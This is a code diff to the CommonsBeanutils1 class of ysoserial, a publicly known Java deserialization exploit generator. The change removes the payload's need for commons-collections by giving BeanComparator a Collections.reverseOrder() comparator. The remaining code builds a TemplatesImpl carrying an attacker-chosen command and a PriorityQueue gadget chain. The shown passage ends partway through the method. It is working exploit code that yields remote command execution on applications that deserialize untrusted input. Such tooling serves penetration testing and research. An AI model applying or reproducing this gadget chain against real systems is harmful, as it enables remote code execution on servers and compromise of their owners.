@@ -1,6 +1,7 @@
 package ysoserial.payloads;
 
 import java.math.BigInteger;
+import java.util.Collections;
 import java.util.PriorityQueue;
 
 import org.apache.commons.beanutils.BeanComparator;
@@ -12,14 +13,14 @@ import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
 @SuppressWarnings({ "rawtypes", "unchecked" })
-@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
+@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-logging:commons-logging:1.2"})
 @Authors({ Authors.FROHOFF })
 public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 		// mock method name until armed
-		final BeanComparator comparator = new BeanComparator("lowestSetBit");
+		final BeanComparator comparator = new BeanComparator("lowestSetBit", Collections.reverseOrder());
 
 		// create queue with numbers and basic comparator
 		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
